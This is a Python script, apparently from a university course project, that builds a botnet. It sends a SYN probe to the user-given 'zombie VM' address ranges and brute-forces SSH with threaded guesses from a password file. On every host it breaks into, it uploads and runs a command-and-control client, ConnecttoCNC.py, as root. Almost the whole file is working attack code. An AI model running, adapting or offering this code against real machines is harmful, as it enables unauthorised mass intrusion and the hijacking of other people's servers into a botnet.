from scapy.all import *
import paramiko
import threading

paramiko.util.log_to_file("connections.log")

zombievms = raw_input("Enter the number of Zombie VM's")

clientslist = list()
threadpool = list()
connectresults = list()
successclients = list()
def tryandconnect(ipaddresses,passwordsource,successfullyconnectedclients):
	try:
		client = paramiko.SSHClient()
		client.load_system_host_keys()
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		client.connect(ipaddresses,password=passwordsource)
		client.exec_command('rm /root/ConnecttoCNC.py')
		client.exec_command('touch /root/ConnecttoCNC.py')
		sftp = client.open_sftp()
		sftp.put('/root/CS445-Project/ConnecttoCNC.py','/root/ConnecttoCNC.py')
		successfullyconnectedclients.append(client)
	except(paramiko.ssh_exception.AuthenticationException,paramiko.ssh_exception.SSHException) as e:
		#print(e)
		return None


def generaterangeofipstoconnect(rangestr):
	listofips = []
	for index in range(255):
		listofips.append(rangestr + '.' + str(index))

	print(listofips)

	return listofips


for index in range(int(zombievms)):
	ipaddresses = raw_input("Enter a range of IP addresses (ex: 192.168.56) of zombie VM {}: ".format(index + 1))
	
	#Send SYN scan to zombie VM
	answer= sr1(IP(dst=ipaddresses)/TCP(dport=80,flags="S"))
	print(answer.display())

	#ADD CHECK FOR IF RESPONSE IS RECEIEVED


	#SSH into machine
	#client = paramiko.SSHClient()
	#client.load_system_host_keys()
	with open("Passwords.txt",'r') as file:
		content = file.readlines()
		listofpasswords = [index.strip() for index in content]
		for row in listofpasswords:
			t = threading.Thread(target=tryandconnect, args = (ipaddresses,row,successclients))
			threadpool.append(t)
			t.start()

		for threadresult in threadpool:
			threadresult.join()

		for successclientsiterator in successclients:
			stdin,stdout,stderr = successclientsiterator.exec_command('python /root/ConnecttoCNC.py')
			#print(stdout.readlines())
				#client.connect(ipaddresses,password=row)
				#clientslist.append(client)
				#stdin,stdout,stderr = client.exec_command('ls -l')
				#print(stdout.readlines())


